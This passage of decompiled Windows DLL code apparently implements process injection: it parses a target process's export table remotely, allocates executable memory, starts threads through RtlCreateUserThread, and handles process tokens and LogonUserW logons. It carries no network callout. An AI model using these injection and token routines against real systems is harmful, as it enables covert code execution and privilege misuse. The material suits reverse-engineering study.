        LOBYTE(v95) = 46;
        sub_100289BC((int)v56, v34);
        LOBYTE(v95) = 45;
        sub_10028854((int)v60);
        v58 = 1;
        sub_10028BB4(v56, v52);
        v94 = 0;
        if ( ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int, int, int **, _DWORD))a4)(
               *(_DWORD *)(v85[0] + 16),
               0,
               0,
               0,
               0,
               0,
               v57 + v51[3],
               v57,
               &v94,
               0) )
        {
          sub_10016441(&v75);
          v12 = &v75;
        }
        else if ( v94 )
        {
          v58 = 0;
          v35 = sub_1000E9E2(v81, v94, 0);
          LOBYTE(v95) = 47;
          sub_10013739(v35 + 1, v78);
          v78[1] = v35[2];
          LOBYTE(v95) = 45;
          sub_1000EA34(v81);
          sub_10014E23((int)&v77, 1000, 0);
          v58 = 1;
          if ( a5 || sub_1000EBB2(&v82) )
          {
            LOBYTE(v95) = 44;
            sub_10016B53(v52);
            LOBYTE(v95) = 43;
            sub_10016B53(v48);
            LOBYTE(v95) = 41;
            sub_10016B53(v51);
            LOBYTE(v95) = 38;
            sub_10027930(&v90);
            LOBYTE(v95) = 37;
            sub_10028854((int)v53);
            LOBYTE(v95) = 25;
            sub_10016B53(v50);
            v95 = 24;
            sub_1000ECB8((int)&v82, a2);
            v87 = 1;
            LOBYTE(v95) = 23;
            sub_1000EA34(&v77);
            LOBYTE(v95) = 22;
            sub_1000EA34(&v82);
            LOBYTE(v95) = 12;
            sub_10028854((int)v56);
            LOBYTE(v95) = 11;
            sub_1002469A(v64);
            LOBYTE(v95) = 0;
            sub_10001FCC(&v84);
            return a2;
          }
          sub_10016441(&v69);
          v12 = &v69;
        }
        else
        {
          sub_10016441(&v76);
          v12 = &v76;
        }
      }
      else
      {
        sub_10016441(&v71);
        v12 = &v71;
      }
    }
LABEL_6:
    _CxxThrowException(v12, v39);
  }
  v14 = (wchar_t *)sub_1000E943((int)&unk_100B7418);
  v42 = v15;
  Block = (int)&v42;
  sub_1000CC20(&v42, v14);
  v95 = 8;
  v41 = (char *)v16;
  v40 = v16;
  v93 = &v40;
  sub_1000CE26(&v40, (int)&unk_100BF76C);
  LOBYTE(v95) = 0;
  v93 = (int *)sub_1002481B(v40, (int)v41, v42);
  Block = 128;
  sub_1002785C((int)&v90, &Block);
  v95 = 10;
  v17 = *(_DWORD *)(v6[1] + 16);
  v43 = 0;
  v42 = a5 != 0 ? 4 : 0;
  v41 = a4;
  v40 = a3;
  v39 = 0;
  v18 = (void *)((int (__cdecl *)(int, _DWORD))v93)(v17, 0);
  sub_10027909(v19, (int)&v90);
  if ( !v18 )
  {
    sub_10016441(&v72);
    v36 = &_TI1_AVSnsziibtx_sr__;
    v12 = &v72;
    goto LABEL_6;
  }
  sub_1000E9E2(a2, v18, 0);
  v87 = 1;
  LOBYTE(v95) = 0;
  sub_10027930(&v90);
  return a2;
}
// 10023398: variable 'v9' is possibly undefined
// 100233A9: variable 'v10' is possibly undefined
// 100235F5: variable 'v15' is possibly undefined
// 10023609: variable 'v16' is possibly undefined
// 10023667: variable 'v19' is possibly undefined
// 10023A9D: variable 'v29' is possibly undefined
// 10023AB3: variable 'v30' is possibly undefined
// 10023B35: variable 'v32' is possibly undefined
// 100334CB: using guessed type void __noreturn sub_100334CB(void);
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10073DAE: using guessed type char byte_10073DAE;
// 100B7404: using guessed type wchar_t aNtdllDll_3[10];
// 100B7478: using guessed type wchar_t word_100B7478[2];
// 100B747C: using guessed type wchar_t aThPoolShdPqomg[30];
// 100B74B8: using guessed type wchar_t word_100B74B8[2];
// 100B74BC: using guessed type wchar_t aThPoolShdMtxGm[27];
// 100B74F4: using guessed type wchar_t aRtlcreateusert[20];
// 100B751C: using guessed type wchar_t aNtdllDll_4[10];
// 100BC72C: using guessed type int (__cdecl *dword_100BC72C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100BF9C0: using guessed type int dword_100BF9C0;
// 10023355: using guessed type _DWORD pExceptionObject[2];
// 10023355: using guessed type _DWORD var_108[2];
// 10023355: using guessed type int var_100[6];
// 10023355: using guessed type _DWORD var_16C[2];
// 10023355: using guessed type _DWORD var_DC[2];
// 10023355: using guessed type _DWORD var_140[8];
// 10023355: using guessed type HANDLE var_B8[4];
// 10023355: using guessed type _DWORD var_24[2];
// 10023355: using guessed type int var_68[3];
// 10023355: using guessed type int var_1D0[5];

//----- (10023E0B) --------------------------------------------------------
_DWORD *__thiscall sub_10023E0B(_DWORD *this, _DWORD *a2, DWORD DesiredAccess)
{
  int v3; // eax
  HANDLE pExceptionObject[4]; // [esp+10h] [ebp-20h] BYREF
  HANDLE TokenHandle; // [esp+20h] [ebp-10h] BYREF

  pExceptionObject[3] = 0;
  v3 = this[1];
  TokenHandle = 0;
  if ( !OpenProcessToken(*(HANDLE *)(v3 + 16), DesiredAccess, &TokenHandle) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10024B21(a2, TokenHandle);
  return a2;
}

//----- (10023E70) --------------------------------------------------------
DWORD __thiscall sub_10023E70(_DWORD *this)
{
  int v1; // eax
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-10h] BYREF
  DWORD pSessionId; // [esp+10h] [ebp-4h] BYREF

  v1 = sub_1001A85E(this);
  if ( !ProcessIdToSessionId(v1, &pSessionId) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return pSessionId;
}
// 10023E70: using guessed type _DWORD pExceptionObject[3];

//----- (10023EAB) --------------------------------------------------------
DWORD __thiscall sub_10023EAB(void *this, int a2)
{
  int v3; // ecx
  int v4; // ecx
  char *v5; // eax
  DWORD v6; // esi
  int v8; // [esp-10h] [ebp-90h] BYREF
  int v9; // [esp-Ch] [ebp-8Ch]
  int v10[2]; // [esp-8h] [ebp-88h] BYREF
  int v11; // [esp+0h] [ebp-80h]
  int v12; // [esp+4h] [ebp-7Ch]
  int v13; // [esp+8h] [ebp-78h]
  int *v14; // [esp+1Ch] [ebp-64h]
  int *v15; // [esp+20h] [ebp-60h]
  int v16[3]; // [esp+24h] [ebp-5Ch] BYREF
  int v17[5]; // [esp+30h] [ebp-50h] BYREF
  _DWORD v18[10]; // [esp+44h] [ebp-3Ch] BYREF
  char v19; // [esp+6Ch] [ebp-14h]
  int v20; // [esp+7Ch] [ebp-4h]

  sub_10016A08(a2, (int)v17);
  v20 = 0;
  (*(void (__thiscall **)(void *, _DWORD *, int, int, int))(*(_DWORD *)this + 44))(this, v18, v17[3], 64, 4096);
  LOBYTE(v20) = 1;
  v19 = 1;
  sub_10028BB4(v18, v17);
  v13 = 60000;
  v12 = 0;
  v11 = v18[8];
  v10[1] = v3;
  v10[0] = v3;
  v14 = v10;
  sub_1000CC20(v10, aGetmodulehandl_0);
  LOBYTE(v20) = 2;
  v9 = v4;
  v8 = v4;
  v15 = &v8;
  sub_1000CE26(&v8, (int)&unk_100BF76C);
  LOBYTE(v20) = 1;
  v5 = sub_1002481B(v8, v9, v10[0]);
  (*(void (__thiscall **)(void *, int *, char *, int, int, int))(*(_DWORD *)this + 56))(this, v16, v5, v11, v12, v13);
  LOBYTE(v20) = 4;
  sub_10014E23((int)v16, 5000, 0);
  v6 = sub_1000EA59(v16);
  LOBYTE(v20) = 1;
  sub_1000EA34(v16);
  LOBYTE(v20) = 0;
  sub_10028854((int)v18);
  v20 = -1;
  sub_10016B53(v17);
  return v6;
}
// 10023F24: variable 'v3' is possibly undefined
// 10023F3F: variable 'v4' is possibly undefined
// 100B7530: using guessed type wchar_t aGetmodulehandl_0[17];
// 10023EAB: using guessed type int var_5C[3];

//----- (10023FD6) --------------------------------------------------------
int __thiscall sub_10023FD6(void *this, int a2, int a3)
{
  int v4; // eax
  int v5; // eax
  _DWORD *v6; // ebx
  int v7; // eax
  int v8; // eax
  int v9; // eax
  unsigned __int16 v11; // ax
  int v12; // esi
  int pExceptionObject; // [esp+10h] [ebp-1DCh] BYREF
  _DWORD *v14; // [esp+14h] [ebp-1D8h] BYREF
  int v15[2]; // [esp+18h] [ebp-1D4h] BYREF
  _DWORD v16[4]; // [esp+20h] [ebp-1CCh] BYREF
  int v17[5]; // [esp+30h] [ebp-1BCh] BYREF
  int v18[5]; // [esp+44h] [ebp-1A8h] BYREF
  int v19[5]; // [esp+58h] [ebp-194h] BYREF
  int v20[5]; // [esp+6Ch] [ebp-180h] BYREF
  int v21[5]; // [esp+80h] [ebp-16Ch] BYREF
  int v22[5]; // [esp+94h] [ebp-158h] BYREF
  _DWORD v23[2]; // [esp+A8h] [ebp-144h] BYREF
  int v24[9]; // [esp+B0h] [ebp-13Ch] BYREF
  _DWORD v25[2]; // [esp+D4h] [ebp-118h] BYREF
  int v26[9]; // [esp+DCh] [ebp-110h] BYREF
  char v27[8]; // [esp+100h] [ebp-ECh] BYREF
  char v28[36]; // [esp+108h] [ebp-E4h] BYREF
  char v29[8]; // [esp+12Ch] [ebp-C0h] BYREF
  int v30[9]; // [esp+134h] [ebp-B8h] BYREF
  char v31[8]; // [esp+158h] [ebp-94h] BYREF
  int v32[9]; // [esp+160h] [ebp-8Ch] BYREF
  char v33[8]; // [esp+184h] [ebp-68h] BYREF
  int v34[9]; // [esp+18Ch] [ebp-60h] BYREF
  char v35[8]; // [esp+1B0h] [ebp-3Ch] BYREF
  int v36[10]; // [esp+1B8h] [ebp-34h] BYREF
  int v37; // [esp+1E8h] [ebp-4h]

  if ( !a2 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10028754(a2, (int)this, (int)v35, 64);
  v37 = 0;
  sub_10016983((void *)0x40, (int)v20, 0);
  LOBYTE(v37) = 1;
  if ( sub_10028DCD(v36, v20) != 64 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v4 = sub_10016C24(v20);
  if ( *(_WORD *)v4 != 23117 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10028754(*(_DWORD *)(v4 + 60) + a2 + 24, (int)this, (int)v31, 224);
  LOBYTE(v37) = 2;
  sub_10016983((void *)0xE0, (int)v18, 0);
  LOBYTE(v37) = 3;
  if ( sub_10028DCD(v32, v18) != 224 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v5 = sub_10016C24(v18);
  if ( *(_WORD *)v5 != 267 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10028754(*(_DWORD *)(v5 + 96) + a2, (int)this, (int)v29, 40);
  LOBYTE(v37) = 4;
  sub_10016983((void *)0x28, (int)v17, 0);
  LOBYTE(v37) = 5;
  if ( sub_10028DCD(v30, v17) != 40 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v6 = (_DWORD *)sub_10016C24(v17);
  v7 = v6[8];
  v14 = v6;
  if ( !v7 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10028754(v7 + a2, (int)this, (int)v33, 4 * v6[6]);
  LOBYTE(v37) = 6;
  v8 = v6[9];
  if ( !v8 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10028754(v8 + a2, (int)this, (int)v25, 2 * v6[5]);
  LOBYTE(v37) = 7;
  sub_10028754(a2 + v6[7], (int)this, (int)v23, 4 * v6[5]);
  LOBYTE(v37) = 8;
  pExceptionObject = 0;
  if ( v6[6] )
  {
    while ( 1 )
    {
      sub_10016983((void *)4, (int)v19, 0);
      LOBYTE(v37) = 9;
      if ( sub_10028DCD(v34, v19) != 4 )
      {
        sub_10016441(&v14);
        _CxxThrowException(&v14, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
      }
      v9 = sub_10016E72(v19, 0);
      sub_10028754(v9 + a2, (int)this, (int)v27, 0);
      LOBYTE(v37) = 10;
      sub_10033707(v16, (int)v28);
      LOBYTE(v37) = 11;
      sub_100337EA(v16, v15);
      LOBYTE(v37) = 12;
      if ( !sub_1000D0B5(a3, (int)v15) )
        break;
      LOBYTE(v37) = 11;
      sub_1000CE59(v15);
      LOBYTE(v37) = 10;
      sub_10033758(v16);
      LOBYTE(v37) = 9;
      sub_10028854((int)v27);
      LOBYTE(v37) = 8;
      sub_10016B53(v19);
      if ( (unsigned int)++pExceptionObject >= v14[6] )
        goto LABEL_21;
    }
    sub_10028D2D(v25, 2 * pExceptionObject, 0);
    sub_10016983((void *)2, (int)v22, 0);
    LOBYTE(v37) = 13;
    if ( sub_10028DCD(v26, v22) != 2 )
    {
      sub_10016441(&v14);
      _CxxThrowException(&v14, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v11 = sub_10016EC6(v22);
    sub_10028D2D(v23, 4 * v11, 0);
    sub_10016983((void *)4, (int)v21, 0);
    LOBYTE(v37) = 14;
    if ( sub_10028DCD(v24, v21) != 4 )
    {
      sub_10016441(&v14);
      _CxxThrowException(&v14, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v12 = sub_10016E72(v21, 0) + a2;
    LOBYTE(v37) = 13;
    sub_10016B53(v21);
    LOBYTE(v37) = 12;
    sub_10016B53(v22);
    LOBYTE(v37) = 11;
    sub_1000CE59(v15);
    LOBYTE(v37) = 10;
    sub_10033758(v16);
    LOBYTE(v37) = 9;
    sub_10028854((int)v27);
    LOBYTE(v37) = 8;
    sub_10016B53(v19);
    LOBYTE(v37) = 7;
    sub_10028854((int)v23);
    LOBYTE(v37) = 6;
    sub_10028854((int)v25);
    LOBYTE(v37) = 5;
    sub_10028854((int)v33);
    LOBYTE(v37) = 4;
    sub_10016B53(v17);
    LOBYTE(v37) = 3;
    sub_10028854((int)v29);
    LOBYTE(v37) = 2;
    sub_10016B53(v18);
    LOBYTE(v37) = 1;
    sub_10028854((int)v31);
    LOBYTE(v37) = 0;
    sub_10016B53(v20);
    v37 = -1;
    sub_10028854((int)v35);
    return v12;
  }
  else
  {
LABEL_21:
    LOBYTE(v37) = 7;
    sub_10028854((int)v23);
    LOBYTE(v37) = 6;
    sub_10028854((int)v25);
    LOBYTE(v37) = 5;
    sub_10028854((int)v33);
    LOBYTE(v37) = 4;
    sub_10016B53(v17);
    LOBYTE(v37) = 3;
    sub_10028854((int)v29);
    LOBYTE(v37) = 2;
    sub_10016B53(v18);
    LOBYTE(v37) = 1;
    sub_10028854((int)v31);
    LOBYTE(v37) = 0;
    sub_10016B53(v20);
    v37 = -1;
    sub_10028854((int)v35);
    return 0;
  }
}
// 10023FD6: using guessed type int var_180[5];
// 10023FD6: using guessed type int var_34[10];
// 10023FD6: using guessed type int var_1A8[5];
// 10023FD6: using guessed type int var_8C[9];
// 10023FD6: using guessed type int var_1BC[5];
// 10023FD6: using guessed type int var_B8[9];
// 10023FD6: using guessed type _DWORD var_118[2];
// 10023FD6: using guessed type _DWORD var_144[2];
// 10023FD6: using guessed type int var_194[5];
// 10023FD6: using guessed type int var_60[9];
// 10023FD6: using guessed type char var_E4[36];
// 10023FD6: using guessed type _DWORD var_1CC[4];
// 10023FD6: using guessed type int var_158[5];
// 10023FD6: using guessed type int var_110[9];
// 10023FD6: using guessed type int var_16C[5];
// 10023FD6: using guessed type int var_13C[9];

//----- (10024613) --------------------------------------------------------
int __thiscall sub_10024613(int *this, int a2, int a3)
{
  int v4; // esi
  int v5; // eax

  v4 = *this;
  v5 = (*(int (__thiscall **)(int *, int, int))(*this + 60))(this, a2, a3);
  return (*(int (__thiscall **)(int *, int))(v4 + 68))(this, v5);
}

//----- (10024631) --------------------------------------------------------
int __thiscall sub_10024631(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1002465F) --------------------------------------------------------
_DWORD *__usercall sub_1002465F@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002469A) --------------------------------------------------------
void __thiscall sub_1002469A(void *this)
{
  sub_10024708((int)this);
}

//----- (100246C5) --------------------------------------------------------
void __usercall sub_100246C5(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10024708((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10024708) --------------------------------------------------------
void __usercall sub_10024708(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002475C) --------------------------------------------------------
HMODULE __cdecl sub_1002475C(LPCSTR lpModuleName)
{
  return GetModuleHandleA(lpModuleName);
}

//----- (1002476A) --------------------------------------------------------
HMODULE __cdecl sub_1002476A(LPCWSTR lpModuleName)
{
  return GetModuleHandleW(lpModuleName);
}

//----- (10024778) --------------------------------------------------------
HMODULE __cdecl sub_10024778(int a1, int a2)
{
  HMODULE v2; // esi
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  pExceptionObject[5] = 0;
  v2 = sub_1002476A(*(LPCWSTR *)(a2 + 12));
  if ( !v2 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000CE59(&a1);
  return v2;
}

//----- (100247C6) --------------------------------------------------------
char *__cdecl sub_100247C6(char *a1, int a2)
{
  const CHAR *v2; // eax
  char *v3; // esi
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  pExceptionObject[5] = 0;
  v2 = (const CHAR *)sub_1000CED7((int)&a2);
  v3 = sub_1002491F(a1, v2);
  if ( !v3 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000CE59(&a2);
  return v3;
}

//----- (1002481B) --------------------------------------------------------
char *__cdecl sub_1002481B(int a1, int a2, int a3)
{
  int v3; // ecx
  char *v4; // eax
  char *v5; // esi
  int v7; // [esp-8h] [ebp-34h] BYREF
  int v8; // [esp-4h] [ebp-30h]
  int v9[10]; // [esp+0h] [ebp-2Ch] BYREF
  int v10; // [esp+28h] [ebp-4h]

  v10 = 1;
  v9[7] = (int)v9;
  sub_1000CE26(v9, (int)&a3);
  LOBYTE(v10) = 2;
  v8 = v3;
  v7 = v3;
  v9[6] = (int)&v7;
  sub_1000CE26(&v7, (int)&a1);
  LOBYTE(v10) = 2;
  v4 = (char *)sub_10024778(v7, v8);
  LOBYTE(v10) = 1;
  v5 = sub_100247C6(v4, v9[0]);
  LOBYTE(v10) = 0;
  sub_1000CE59(&a1);
  v10 = -1;
  sub_1000CE59(&a3);
  return v5;
}
// 10024843: variable 'v3' is possibly undefined

//----- (10024892) --------------------------------------------------------
void __usercall sub_10024892(_DWORD *a1@<esi>, HMODULE hModule)
{
  _DWORD pExceptionObject[5]; // [esp+10h] [ebp-22Ch] BYREF
  WCHAR Filename[266]; // [esp+24h] [ebp-218h] BYREF
  int v4; // [esp+238h] [ebp-4h]

  pExceptionObject[4] = 0;
  pExceptionObject[3] = a1;
  if ( !GetModuleFileNameW(hModule, Filename, 0x104u) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000CC20(a1, Filename);
  v4 = 0;
  sub_1006A5A7();
}

//----- (10024909) --------------------------------------------------------
_BYTE *__usercall sub_10024909@<eax>(_BYTE *result@<eax>)
{
  while ( *result )
  {
    if ( *result == 46 )
      return result;
    ++result;
  }
  return 0;
}

//----- (1002491F) --------------------------------------------------------
char *__cdecl sub_1002491F(char *lp, LPCSTR lpsz)
{
  char *v2; // esi
  int v3; // eax
  char *v4; // esi
  char *v5; // ebx
  CHAR *v7; // ebx
  _BYTE *v8; // eax
  unsigned __int16 v9; // ax
  int v10; // esi
  HMODULE ModuleHandleA; // edi
  const CHAR *v12; // esi
  char *v13; // [esp+10h] [ebp-124h]
  int v14; // [esp+14h] [ebp-120h]
  int ucb; // [esp+18h] [ebp-11Ch]
  char *v16; // [esp+1Ch] [ebp-118h]
  LPCSTR lpString1; // [esp+20h] [ebp-114h]
  int v18; // [esp+24h] [ebp-110h]
  CHAR String1[264]; // [esp+28h] [ebp-10Ch] BYREF

  if ( IsBadReadPtr(lp, 4u) )
    return 0;
  if ( IsBadStringPtrA(lpsz, 0xFFu) )
    return 0;
  ucb = lstrlenA(lpsz);
  if ( *(_WORD *)lp != 23117 )
    return 0;
  v2 = &lp[*((_DWORD *)lp + 15) + 24];
  if ( IsBadReadPtr(v2, 4u) )
    return 0;
  if ( *(_WORD *)v2 != 267 )
    return 0;
  v3 = *((_DWORD *)v2 + 24);
  v14 = *((_DWORD *)v2 + 25);
  if ( !v3 )
    return 0;
  v18 = 0;
  v4 = &lp[v3];
  v13 = &lp[*(_DWORD *)&lp[v3 + 36]];
  v5 = &lp[*(_DWORD *)&lp[v3 + 32]];
  v16 = &lp[*(_DWORD *)&lp[v3 + 28]];
  if ( !*(_DWORD *)&lp[v3 + 24] )
    return 0;
  while ( 1 )
  {
    lpString1 = &lp[*(_DWORD *)&v5[4 * v18]];
    if ( !IsBadReadPtr(lpString1, ucb) && !lstrcmpiA(lpString1, lpsz) )
      break;
    if ( (unsigned int)++v18 >= *((_DWORD *)v4 + 6) )
      return 0;
  }
  v7 = &lp[*(_DWORD *)&v16[4 * *(unsigned __int16 *)&v13[2 * v18]]];
  if ( v7 >= v4 && v7 <= &v4[v14] )
  {
    v8 = sub_10024909(v7);
    if ( v8 )
    {
      v9 = (_WORD)v8 - (_WORD)v7;
      if ( v9 <= 0x104u )
      {
        if ( v9 )
        {
          v10 = v9;
          if ( lstrcpynA(String1, v7, v9 + 1) )
          {
            String1[v10] = 0;
            ModuleHandleA = GetModuleHandleA(String1);
            if ( ModuleHandleA )
            {
              v12 = &v7[v10 + 1];
              if ( *v12 != 35 || lstrlenA(v12) <= 1 )
                return (char *)sub_1002491F(ModuleHandleA, v12);
            }
          }
        }
      }
    }
    return 0;
  }
  return &lp[*(_DWORD *)&v16[4 * *(unsigned __int16 *)&v13[2 * v18]]];
}
// 1002491F: using guessed type CHAR String1[264];

//----- (10024AE4) --------------------------------------------------------
_DWORD *__thiscall sub_10024AE4(_DWORD *this)
{
  DWORD v2; // eax
  int CurrentProcessId; // [esp-4h] [ebp-24h]

  *this = &off_100947CC;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10029136(this + 1, (void *)0xFFFFFFFF, 0, 0, v2, CurrentProcessId);
  return this;
}
// 100947CC: using guessed type int (__thiscall *off_100947CC)(void *Block, char);

//----- (10024B21) --------------------------------------------------------
_DWORD *__stdcall sub_10024B21(_DWORD *a1, void *a2)
{
  DWORD v2; // eax
  int CurrentProcessId; // [esp-4h] [ebp-20h]

  *a1 = &off_100947CC;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10029136(a1 + 1, a2, 0, 0, v2, CurrentProcessId);
  return a1;
}
// 100947CC: using guessed type int (__thiscall *off_100947CC)(void *Block, char);

//----- (10024B5F) --------------------------------------------------------
bool __thiscall sub_10024B5F(_DWORD *this)
{
  *this = &off_100947CC;
  return sub_10014389(this + 1);
}
// 100947CC: using guessed type int (__thiscall *off_100947CC)(void *Block, char);

//----- (10024B86) --------------------------------------------------------
_DWORD *__stdcall sub_10024B86(
        _DWORD *a1,
        int a2,
        int a3,
        LPCWSTR lpszUsername,
        DWORD dwLogonType,
        DWORD dwLogonProvider)
{
  DWORD v6; // eax
  DWORD v7; // eax
  int CurrentProcessId; // [esp-4h] [ebp-30h]
  int v10; // [esp-4h] [ebp-30h]
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-1Ch] BYREF
  HANDLE phToken[4]; // [esp+1Ch] [ebp-10h] BYREF

  *a1 = &off_100947CC;
  CurrentProcessId = GetCurrentProcessId();
  v6 = GetCurrentProcessId();
  sub_10029136(a1 + 1, (void *)0xFFFFFFFF, 0, 0, v6, CurrentProcessId);
  phToken[3] = 0;
  phToken[0] = 0;
  if ( !LogonUserW(
          *(LPCWSTR *)(*(_DWORD *)(a2 + 4) + 12),
          *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12),
          *(LPCWSTR *)(*((_DWORD *)lpszUsername + 1) + 12),
          dwLogonType,
          dwLogonProvider,
          phToken) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v10 = GetCurrentProcessId();
  v7 = GetCurrentProcessId();
  sub_10015027(a1 + 1, phToken[0], 0, 0, v7, v10);
  return a1;
}
// 100947CC: using guessed type int (__thiscall *off_100947CC)(void *Block, char);
// 10024B86: using guessed type _DWORD pExceptionObject[3];

//----- (10024C2E) --------------------------------------------------------
int __thiscall sub_10024C2E(_DWORD *this)
{
  return this[2];
}

//----- (10024C32) --------------------------------------------------------
int __thiscall sub_10024C32(_DWORD *this)
{
  void *v1; // ecx
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-14h] BYREF
  int TokenInformation; // [esp+Ch] [ebp-8h] BYREF
  DWORD ReturnLength; // [esp+10h] [ebp-4h] BYREF

  v1 = (void *)this[2];
  ReturnLength = 0;
  if ( !GetTokenInformation(v1, TokenType, &TokenInformation, 4u, &ReturnLength) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return TokenInformation;
}
// 10024C32: using guessed type _DWORD pExceptionObject[3];

//----- (10024C73) --------------------------------------------------------
int __thiscall sub_10024C73(_DWORD *this)
{
  void *v1; // ecx
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-14h] BYREF
  int TokenInformation; // [esp+Ch] [ebp-8h] BYREF
  DWORD ReturnLength; // [esp+10h] [ebp-4h] BYREF

  v1 = (void *)this[2];
  ReturnLength = 0;
  if ( !GetTokenInformation(v1, TokenImpersonationLevel, &TokenInformation, 4u, &ReturnLength) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return TokenInformation;
}
// 10024C73: using guessed type _DWORD pExceptionObject[3];

//----- (10024CB4) --------------------------------------------------------
void __userpurge sub_10024CB4(int a1@<eax>, int a2)
{
  void *v2; // edi
  DWORD v3; // eax
  int CurrentProcessId; // [esp-4h] [ebp-Ch]

  v2 = *(void **)(a1 + 8);
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10015027((_DWORD *)(a2 + 4), v2, 1, 0, v3, CurrentProcessId);
}

//----- (10024CDE) --------------------------------------------------------
_DWORD *__stdcall sub_10024CDE(_DWORD *a1, int a2)
{
  DWORD v2; // eax
  int CurrentProcessId; // [esp-4h] [ebp-20h]

  *a1 = &off_100947CC;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10029136(a1 + 1, (void *)0xFFFFFFFF, 0, 0, v2, CurrentProcessId);
  sub_10024CB4(a2, (int)a1);
  return a1;
}
// 100947CC: using guessed type int (__thiscall *off_100947CC)(void *Block, char);

//----- (10024D28) --------------------------------------------------------
int __userpurge sub_10024D28@<eax>(int a1@<eax>, int a2)
{
  if ( a2 != a1 )
    sub_10024CB4(a1, a2);
  return a2;
}

//----- (10024D3F) --------------------------------------------------------
_DWORD *__thiscall sub_10024D3F(_DWORD *this, _DWORD *a2)
{
  void *v3; // edi
  void *v4; // eax
  void *v5; // eax
  void *v7; // [esp-14h] [ebp-58h]
  DWORD v8; // [esp-8h] [ebp-4Ch]
  int v9[5]; // [esp+10h] [ebp-34h] BYREF
  HLOCAL pExceptionObject[2]; // [esp+24h] [ebp-20h] BYREF
  char v11; // [esp+2Ch] [ebp-18h]
  int v12; // [esp+30h] [ebp-14h]
  DWORD ReturnLength[3]; // [esp+34h] [ebp-10h] BYREF
  int v14; // [esp+40h] [ebp-4h]

  v12 = 0;
  v7 = (void *)this[2];
  ReturnLength[0] = 0;
  if ( GetTokenInformation(v7, TokenUser, 0, 0, ReturnLength)
    || GetLastError() != 122
    || (sub_10016983((void *)ReturnLength[0], (int)v9, 0),
        v14 = 1,
        v3 = (void *)this[2],
